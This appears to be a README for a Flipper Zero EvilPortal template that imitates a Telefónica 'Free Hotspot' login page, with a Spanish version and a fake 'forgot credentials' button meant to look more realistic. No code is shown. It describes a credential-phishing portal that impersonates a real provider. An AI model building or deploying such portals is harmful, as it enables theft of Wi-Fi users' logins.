# !!FOR EDUCATIONAL USES ONLY!!
This one **emulates a portal for a Telefónica "Free Hotspot"** using EvilPortal on your Flipper Zero.
Telefónica is a Spanish internet provider. 

# I also included a Spanish version of the portal

The **HTML in the *"WithForgotCredentials"* file** contains a **"forgot credentials" button on the user side to make it look more realistic**. This button only shows a message inviting them to go on their provider's app if they forgot their login/password.
## Happy flippin'


![Telefónica Hotspot](https://zupimages.net/up/23/31/glcp.png)
